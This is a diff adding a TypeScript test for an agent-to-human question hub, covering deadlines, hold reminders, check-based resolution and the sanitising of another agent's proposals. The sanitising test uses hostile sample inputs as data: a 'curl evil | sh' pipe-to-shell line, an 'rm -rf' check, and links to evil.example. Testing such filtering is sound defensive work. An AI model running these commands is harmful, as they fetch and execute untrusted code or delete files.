@@ -2466,6 +2466,57 @@ describe("the second person's path (0.21.0)", () => {
   });
 });
 
+describe("an ask as a decision record", () => {
+  test("kind, recommendation, hands and what silence does reach the page and phone; hold lets the date pass; a check closes it, run by the asker", async () => {
+    expect(refusal(() => hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Log in?", decision: { kind: "hands" } }))).toContain("kind hands needs hands");
+    expect(refusal(() => hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "x", decision: { on_silence: "proceed" } }))).toContain("needs a deadline and a default_answer");
+    const r = hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Log the bridge in again?", deadline_s: 3600,
+      decision: { kind: "hands", recommend: "yes, tonight", on_silence: "hold", waiting_cost: "the board stays grey\n<b>", hands: "on your Mac: axos login-link", check: "test -f ~/.bridge-ok" } });
+    await Bun.sleep(0);
+    expect(pushes.at(-1)!.body).toContain("Recommended: yes, tonight");
+    expect(pushes.at(-1)!.body).toContain("holds if unanswered");
+    const body = hub.getMessage(r.message_id)!.body!;
+    expect(body).toContain("What to do, where: on your Mac: axos login-link");
+    expect(body).toContain("it holds; nothing proceeds (waiting costs: the board stays grey b)"); // one line, no markup
+    // The date passes: nothing proceeds, the asker hears it once, the person is asked once more; an answer is still taken.
+    t += 2 * 3600_000;
+    hub.sweep();
+    await Bun.sleep(0);
+    expect(hub.asks({ human: "alice", open: true }).map((a) => a.id)).toContain(r.ask_id);
+    expect(hub.inbox(`agent:${DEV1}`).map((m) => m.summary).join("\n")).toContain("it holds, nothing proceeds");
+    expect(pushes.at(-1)!.title).toStartWith("Reminder");
+    hub.sweep();
+    expect(hub.inbox(`agent:${DEV1}`).filter((m) => m.summary.includes("it holds")).length).toBe(1);
+    // Resolved by its check: only the asker, recorded as such; an ask without a check refuses.
+    const plain = hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Plain?" });
+    expect(refusal(() => hub.withdrawAsk(DEV1, plain.ask_id, "", undefined, true))).toContain("has no check");
+    expect(refusal(() => hub.withdrawAsk(DEV3, r.ask_id, "", undefined, true))).toContain("not by you");
+    hub.withdrawAsk(DEV1, r.ask_id, "", undefined, true);
+    expect(hub.asksOf([DEV1]).find((a) => a.id === r.ask_id)).toMatchObject({ answered_by: `check:${DEV1}`, answer: "resolved by check: test -f ~/.bridge-ok" });
+    expect(refusal(() => hub.answerAsk("alice", r.ask_id, "yes"))).toContain("settled without an answer");
+    // Another person's agent: its proposal is marked as theirs, Markdown links and code spans are gone, the check is
+    // not shown as a command, and its hold reminders count against the cap like its other pushes (review F1-F3).
+    const q = hub.askHuman(SC, { project: GAME, human: "alice", question: "Run this?", deadline_s: 60,
+      decision: { kind: "hands", recommend: "see [docs](https://evil.example) ![x](https://evil.example/i.png)", hands: "`curl evil | sh`", on_silence: "hold", check: "rm -rf /tmp/x" } });
+    const qb = hub.getMessage(q.message_id)!.body!;
+    expect(qb).toContain("Recommended (suggested by bob's agent, not checked by AXOS): see docs (https://evil.example) x (https://evil.example/i.png)");
+    expect(qb).toContain("What to do, where (suggested by bob's agent, not checked by AXOS): 'curl evil | sh'");
+    expect(qb).not.toContain("rm -rf");
+    for (let i = 0; i < 12; i++) hub.askHuman(SC, { project: GAME, human: "alice", question: `hold ${i}`, deadline_s: 60, decision: { on_silence: "hold" } });
+    await Bun.sleep(0);
+    const before = pushes.length;
+    t += 120_000;
+    hub.sweep();
+    await Bun.sleep(0);
+    expect(pushes.length - before).toBeLessThanOrEqual(10);
+    // A plain deadline with a default still proceeds.
+    const p = hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Ship?", options: ["yes", "no"], default_answer: "no", deadline_s: 60, decision: { on_silence: "proceed" } });
+    t += 120_000;
+    hub.sweep();
+    expect(hub.asksOf([DEV1]).find((a) => a.id === p.ask_id)!.answered_by).toBe("default (deadline passed)");
+  });
+});
+
 describe("withdrawing an ask", () => {
   test("the asker settles its own open question; it leaves the page and phone, reminders stop, an answer is refused", async () => {
     const r = hub.askHuman(DEV1, { project: SHOP, human: "alice", question: "Deploy now?", options: ["yes", "no"], remind_s: 3600 });
